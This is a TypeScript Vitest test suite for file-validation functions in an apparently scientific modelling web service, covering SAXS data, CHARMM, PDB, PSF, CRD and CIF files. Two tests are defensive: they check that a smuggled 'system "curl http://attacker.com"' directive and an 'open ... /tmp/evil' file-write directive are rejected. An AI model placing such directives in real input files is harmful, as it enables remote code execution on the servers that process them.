import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import {
  noSpaces,
  isSaxsData,
  hasSaxsQualityIssues,
  isValidConstInpFile,
  hasAllowedResiduesOnly,
  isPsfData,
  isCRD,
  containsChainId,
  cifContainsChainId,
  cifHasAllowedResiduesOnly,
  noLeadingSpaceOnPDBLines,
  detectGaffCofactors,
  detectMetalCofactors
} from '../ValidationFunctions'

const makeFile = (name: string, content: string, type = 'text/plain') => {
  const blob = new Blob([content], { type })
  const file = new File([blob], name, { type })
  ;(file as unknown as { text: () => Promise<string> }).text = async () =>
    content
  Object.defineProperty(file, 'size', { value: content.length })
  return file
}

describe('ValidationFunctions', () => {
  it('noSpaces detects spaces in filename', async () => {
    expect(await noSpaces(makeFile('no_spaces.dat', 'x'))).toBe(true)
    expect(await noSpaces(makeFile('has spaces.dat', 'x'))).toBe(false)
  })

  it('isSaxsData returns valid for plausible 3-column numeric data', async () => {
    const content = `# Q I(Q) Error\n9.37500000E-03 6.52879323E+01 9.99156442E+00\n9.88200000E-03 6.40240326E+01 8.65418671E+00\n`
    const result = await isSaxsData(makeFile('data.dat', content))
    expect(result.valid).toBe(true)
  })

  it('isSaxsData returns invalid for non-numeric content', async () => {
    const content = `this is not valid saxs data`
    const result = await isSaxsData(makeFile('bad.dat', content))
    expect(result.valid).toBe(false)
  })

  it('isValidConstInpFile returns true for valid const.inp (pdb mode)', async () => {
    const content = [
      '! BilboMD const.inp',
      'define segid PROA',
      'cons fix sele segid PROA end',
      'shape ellipsoid',
      'return'
    ].join('\n')
    const result = await isValidConstInpFile(
      makeFile('const.inp', content),
      'pdb'
    )
    expect(result).toBe(true)
  })

  it('isValidConstInpFile rejects system directive (CHARMM RCE vector)', async () => {
    const content = [
      'define fixed sele segid PROA end',
      'cons fix sele fixed end',
      'system "curl http://attacker.com"',
      'return'
    ].join('\n')
    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
    expect(typeof result).toBe('string')
    expect(result as string).toContain('system')
  })

  it('isValidConstInpFile rejects open directive', async () => {
    const content = [
      'define fixed sele segid PROA end',
      'cons fix sele fixed end',
      'open unit 10 write card name /tmp/evil',
      'return'
    ].join('\n')
    const result = await isValidConstInpFile(makeFile('evil.inp', content), 'pdb')
    expect(typeof result).toBe('string')
    expect(result as string).toContain('open')
  })

  it('isValidConstInpFile accepts ! comment lines', async () => {
    const content = [
      '! this is a comment',
      'define fixed sele segid PROA end',
      'cons fix sele fixed end',
      'return'
    ].join('\n')
    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
    expect(result).toBe(true)
  })

  it('isValidConstInpFile accepts * comment lines', async () => {
    const content = [
      '* another comment style',
      'define fixed sele segid PROA end',
      'cons fix sele fixed end',
      'return'
    ].join('\n')
    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
    expect(result).toBe(true)
  })

  it('isValidConstInpFile accepts cons harm lines', async () => {
    const content = [
      'define fixed sele segid PROA end',
      'cons harm force 5.0 sele fixed end',
      'cons fix sele fixed end',
      'return'
    ].join('\n')
    const result = await isValidConstInpFile(makeFile('ok.inp', content), 'pdb')
    expect(result).toBe(true)
  })

  it('hasAllowedResiduesOnly returns valid for standard residues', async () => {
    const content = `ATOM      1  N   MET A   1\nATOM      2  CA  MET A   1\nEND\n`
    const result = await hasAllowedResiduesOnly(makeFile('model.pdb', content))
    expect(result.valid).toBe(true)
  })

  it('hasAllowedResiduesOnly returns valid for common ions (MG, ZN)', async () => {
    const content = `HETATM    1 MG   MG  A   1\nHETATM    2 ZN   ZN  A   2\nEND\n`
    const result = await hasAllowedResiduesOnly(makeFile('model.pdb', content))
    expect(result.valid).toBe(true)
  })

  it('hasAllowedResiduesOnly returns valid for GAFF and metal cofactors (PCA, FAD, HEM)', async () => {
    const content = [
      'HETATM    1  C   PCA A   1',
      'HETATM    2  N   FAD A   2',
      'HETATM    3  FE  HEM A   3',
      'END'
    ].join('\n')
    const result = await hasAllowedResiduesOnly(makeFile('cofactors.pdb', content))
    expect(result.valid).toBe(true)
    expect(result.unsupportedResidues).toHaveLength(0)
  })

  it('hasAllowedResiduesOnly returns invalid for truly unknown residues', async () => {
    const content = `ATOM      1  CA  UNK A   1\nEND\n`
    const result = await hasAllowedResiduesOnly(makeFile('model.pdb', content))
    expect(result.valid).toBe(false)
    expect(result.unsupportedResidues).toContain('UNK')
  })

  it('containsChainId detects presence of chain ID in column 22', async () => {
    const withChain = `ATOM      1  N   MET A   1\nEND\n`
    const noChain = `ATOM      1  N   MET     1\nEND\n`
    expect(await containsChainId(makeFile('with.pdb', withChain))).toBe(true)
    expect(await containsChainId(makeFile('no.pdb', noChain))).toBe(false)
  })

  it('noLeadingSpaceOnPDBLines fails when a line starts with a space', async () => {
    const good = `ATOM      1  N   MET A   1\nEND\n`
    const bad = ` ATOM      1  N   MET A   1\nEND\n`
    expect(await noLeadingSpaceOnPDBLines(makeFile('good.pdb', good))).toBe(
      true
    )
    expect(await noLeadingSpaceOnPDBLines(makeFile('bad.pdb', bad))).toBe(false)
  })

  it('isPsfData returns false for insufficient PSF content', async () => {
    const content = `PSF\n!NATOM\n`
    expect(await isPsfData(makeFile('top.psf', content))).toBe(false)
  })

  it('isPsfData returns true for example PSF', async () => {
    const content = fs.readFileSync(
      path.join(__dirname, '__fixtures__', 'example.psf'),
      'utf-8'
    )
    expect(await isPsfData(makeFile('example.psf', content))).toBe(true)
  })

  it('isPsfData fails when !NATOM count mismatches actual atom lines', async () => {
    const badContent = [
      'PSF EXT CMAP CHEQ XPLOR',
      '',
      '         3 !NTITLE',
      '* HEADER',
      '* SUBHEADER',
      '* DATE',
      '',
      '      3 !NATOM',
      '         1 PROA     1        MET      N        NH3     -0.300000       14.0070           0   0.00000     -0.301140E-02',
      '         2 PROA     1        MET      HT1      HC       0.330000       1.00800           0   0.00000     -0.301140E-02'
    ].join('\n')
    expect(await isPsfData(makeFile('bad.psf', badContent))).toBe(false)
  })

  it('isPsfData fails when !NTITLE is missing', async () => {
    const badContent = [
      'PSF EXT CMAP CHEQ XPLOR',
      '',
      '      2 !NATOM',
      '         1 PROA     1        MET      N        NH3     -0.300000       14.0070           0   0.00000     -0.301140E-02',
      '         2 PROA     1        MET      HT1      HC       0.330000       1.00800           0   0.00000     -0.301140E-02'
    ].join('\n')
    expect(await isPsfData(makeFile('missing-title.psf', badContent))).toBe(
      false
    )
  })

  it('isCRD returns false for insufficient CRD content', async () => {
    const content = `* CRD file\n*\n      1      1 PROA    MET  N    1.0  2.0  3.0\n`
    expect(await isCRD(makeFile('coords.crd', content))).toBe(false)
  })

  it('isCRD returns true for example CRD header', async () => {
    const content = fs.readFileSync(
      path.join(__dirname, '__fixtures__', 'example.crd'),
      'utf-8'
    )
    expect(await isCRD(makeFile('example.crd', content))).toBe(true)
  })

  it('isCRD fails when too many * header lines precede EXT', async () => {
    const badContent = [
      '* a',
      '* b',
      '* c',
      '* d',
      '* e',
      '* f',
      '* g',
      '      10  EXT'
    ].join('\n')
    expect(await isCRD(makeFile('too-many-stars.crd', badContent))).toBe(
      false
    )
  })

  it('isCRD fails when EXT is missing after header', async () => {
    const badContent = ['* a', '* b', '* c', '* d'].join('\n')
    expect(await isCRD(makeFile('no-ext.crd', badContent))).toBe(false)
  })
})

describe('detectGaffCofactors', () => {
  it('returns empty array when no GAFF cofactors are present', async () => {
    const content = `ATOM      1  N   MET A   1\nATOM      2  CA  GLY A   2\nEND\n`
    const result = await detectGaffCofactors(makeFile('model.pdb', content))
    expect(result).toHaveLength(0)
  })

  it('detects PCA in HETATM lines', async () => {
    const content = [
      'ATOM      1  N   GLN A   1',
      'HETATM    2  C   PCA A   2',
      'END'
    ].join('\n')
    const result = await detectGaffCofactors(makeFile('pca.pdb', content))
    expect(result).toContain('PCA')
    expect(result).toHaveLength(1)
  })

  it('detects FAD and returns sorted list', async () => {
    const content = [
      'HETATM    1  N1  FAD A   1',
      'HETATM    2  C   NAD A   2',
      'END'
    ].join('\n')
    const result = await detectGaffCofactors(makeFile('gaff.pdb', content))
    expect(result).toEqual(['FAD', 'NAD'])
  })

  it('deduplicates repeated cofactor entries', async () => {
    const content = [
      'HETATM    1  C1  PCA A   1',
      'HETATM    2  C2  PCA A   1',
      'HETATM    3  C3  PCA A   1',
      'END'
    ].join('\n')
    const result = await detectGaffCofactors(makeFile('dup.pdb', content))
    expect(result).toEqual(['PCA'])
  })

  it('does not flag HEM (metal cofactor) or unknown residues', async () => {
    const content = [
      'HETATM    1  FE  HEM A   1',
      'ATOM      2  CA  UNK A   2',
      'END'
    ].join('\n')
    const result = await detectGaffCofactors(makeFile('hem-unk.pdb', content))
    expect(result).toHaveLength(0)
  })
})

describe('detectMetalCofactors', () => {
  it('returns empty array when no metal cofactors are present', async () => {
    const content = `ATOM      1  N   MET A   1\nHETATM    2  N   FAD A   2\nEND\n`
    const result = await detectMetalCofactors(makeFile('model.pdb', content))
    expect(result).toHaveLength(0)
  })

  it('detects HEM in HETATM lines', async () => {
    const content = [
      'ATOM      1  N   GLN A   1',
      'HETATM    2  FE  HEM A   2',
      'END'
    ].join('\n')
    const result = await detectMetalCofactors(makeFile('hem.pdb', content))
    expect(result).toContain('HEM')
    expect(result).toHaveLength(1)
  })

  it('detects all heme variants and returns sorted list', async () => {
    const content = [
      'HETATM    1  FE  HEB A   1',
      'HETATM    2  FE  HEM A   2',
      'END'
    ].join('\n')
    const result = await detectMetalCofactors(makeFile('hemes.pdb', content))
    expect(result).toEqual(['HEB', 'HEM'])
  })

  it('does not flag FAD (GAFF cofactor) or unknown residues', async () => {
    const content = [
      'HETATM    1  N   FAD A   1',
      'ATOM      2  CA  UNK A   2',
      'END'
    ].join('\n')
    const result = await detectMetalCofactors(makeFile('fad-unk.pdb', content))
    expect(result).toHaveLength(0)
  })
})

// Minimal valid _atom_site loop used across CIF tests
const MINIMAL_CIF = [
  'data_test',
  'loop_',
  '_atom_site.group_PDB',
  '_atom_site.id',
  '_atom_site.label_comp_id',
  '_atom_site.label_asym_id',
  '_atom_site.auth_asym_id',
  '_atom_site.auth_seq_id',
  '_atom_site.Cartn_x',
  '_atom_site.Cartn_y',
  '_atom_site.Cartn_z',
  'ATOM 1 ASN A A 1 12.3 4.5 6.7',
  'ATOM 2 GLY A A 2 13.3 5.5 7.7',
  '#'
].join('\n')

describe('cifContainsChainId', () => {
  it('returns true for a CIF file with a valid auth_asym_id', async () => {
    expect(await cifContainsChainId(makeFile('model.cif', MINIMAL_CIF))).toBe(
      true
    )
  })

  it('returns false when auth_asym_id column is missing', async () => {
    const noChainCif = [
      'data_test',
      'loop_',
      '_atom_site.group_PDB',
      '_atom_site.id',
      '_atom_site.label_comp_id',
      'ATOM 1 ASN',
      '#'
    ].join('\n')
    expect(
      await cifContainsChainId(makeFile('nochain.cif', noChainCif))
    ).toBe(false)
  })

  it('returns false for a non-CIF file', async () => {
    const notCif = 'ATOM      1  N   MET A   1\nEND\n'
    expect(await cifContainsChainId(makeFile('model.cif', notCif))).toBe(false)
  })
})

describe('cifHasAllowedResiduesOnly', () => {
  it('returns valid for a CIF with only standard amino acids', async () => {
    const result = await cifHasAllowedResiduesOnly(
      makeFile('model.cif', MINIMAL_CIF)
    )
    expect(result.valid).toBe(true)
    expect(result.unsupportedResidues).toHaveLength(0)
  })

  it('returns invalid for a CIF with an unknown residue', async () => {
    const badCif = [
      'data_test',
      'loop_',
      '_atom_site.group_PDB',
      '_atom_site.id',
      '_atom_site.label_comp_id',
      '_atom_site.auth_asym_id',
      'ATOM 1 UNK A',
      '#'
    ].join('\n')
    const result = await cifHasAllowedResiduesOnly(
      makeFile('bad.cif', badCif)
    )
    expect(result.valid).toBe(false)
    expect(result.unsupportedResidues).toContain('UNK')
  })

  it('returns invalid when no _atom_site block is found', async () => {
    const empty = 'data_test\n#\n'
    const result = await cifHasAllowedResiduesOnly(
      makeFile('empty.cif', empty)
    )
    expect(result.valid).toBe(false)
  })
})

describe('hasSaxsQualityIssues', () => {
  // Helper that builds a SAXS .dat line: "q I err"
  const saxsLine = (q: number, I: number, err: number) =>
    `${q} ${I} ${err}`

  it('returns lowSnrCount=0 and warning=null when all error/I ratios are at or below 2', async () => {
    // Three points where error/I = 2.0 exactly — the threshold is STRICT (> 2),
    // so none of these should be flagged.
    const content = [
      saxsLine(0.01, 100, 200), // ratio = 2.0 — at threshold, NOT flagged
      saxsLine(0.02, 80, 160), //  ratio = 2.0 — at threshold, NOT flagged
      saxsLine(0.03, 60, 1)   //  ratio ≈ 0.017 — well below threshold
    ].join('\n')

    const result = await hasSaxsQualityIssues(makeFile('clean.dat', content))

    expect(result.lowSnrCount).toBe(0)
    expect(result.totalCount).toBe(3)
    expect(result.warning).toBeNull()
  })

  it('returns lowSnrCount=2 and a warning mentioning "2 of 3" when two points have error/I > 2', async () => {
    // Points at q=0.01 and q=0.02 have error/I > 2; q=0.03 is clean.
    const content = [
      saxsLine(0.01, 10, 30),  // ratio = 3.0 — flagged
      saxsLine(0.02, 20, 50),  // ratio = 2.5 — flagged
      saxsLine(0.03, 60, 1)   //  ratio ≈ 0.017 — clean
    ].join('\n')

    const result = await hasSaxsQualityIssues(makeFile('noisy.dat', content))

    expect(result.lowSnrCount).toBe(2)
    expect(result.totalCount).toBe(3)
    expect(result.warning).not.toBeNull()
    expect(result.warning).toContain('2 of 3')
  })

  it('does NOT flag a point where error/I is exactly 2.0 (boundary — condition is strictly > 2)', async () => {
    // Exactly at the threshold: should not be counted as low-SNR.
    const content = saxsLine(0.01, 50, 100) // ratio = 2.0

    const result = await hasSaxsQualityIssues(
      makeFile('threshold.dat', content)
    )

    expect(result.lowSnrCount).toBe(0)
    expect(result.warning).toBeNull()
  })

  it('skips comment lines (starting with #) and blank lines when counting totalCount', async () => {
    // Only the two non-comment, non-blank lines should be counted.
    const content = [
      '# Q I(Q) Error',
      '',
      saxsLine(0.01, 100, 10),
      '# another comment',
      '',
      saxsLine(0.02, 80, 5)
    ].join('\n')

    const result = await hasSaxsQualityIssues(
      makeFile('comments.dat', content)
    )

    expect(result.totalCount).toBe(2)
    expect(result.lowSnrCount).toBe(0)
    expect(result.warning).toBeNull()
  })

  it('computes maxErrorRatio correctly across all data points', async () => {
    // ratios: 0.5, 1.0, 3.0 — max should be 3.0
    const content = [
      saxsLine(0.01, 100, 50),  // ratio = 0.5
      saxsLine(0.02, 100, 100), // ratio = 1.0
      saxsLine(0.03, 10, 30)   //  ratio = 3.0 — also flagged
    ].join('\n')

    const result = await hasSaxsQualityIssues(
      makeFile('ratios.dat', content)
    )

    expect(result.maxErrorRatio).toBeCloseTo(3.0, 5)
    expect(result.lowSnrCount).toBe(1)
  })

  it('returns totalCount=0 and warning=null for an empty file', async () => {
    const result = await hasSaxsQualityIssues(makeFile('empty.dat', ''))

    expect(result.totalCount).toBe(0)
    expect(result.lowSnrCount).toBe(0)
    expect(result.maxErrorRatio).toBe(0)
    expect(result.warning).toBeNull()
  })

  it('returns totalCount=0 and warning=null for a comment-only file', async () => {
    const content = ['# header', '# more comments', ''].join('\n')

    const result = await hasSaxsQualityIssues(
      makeFile('comments-only.dat', content)
    )

    expect(result.totalCount).toBe(0)
    expect(result.lowSnrCount).toBe(0)
    expect(result.warning).toBeNull()
  })

  it('skips lines where I <= 0 and does not count them toward totalCount', async () => {
    // A line with I = 0 is skipped by the guard `I <= 0`.
    const content = [
      saxsLine(0.01, 0, 5),   // I = 0 — skipped
      saxsLine(0.02, 80, 10) //  valid
    ].join('\n')

    const result = await hasSaxsQualityIssues(
      makeFile('zero-intensity.dat', content)
    )

    expect(result.totalCount).toBe(1)
  })
})
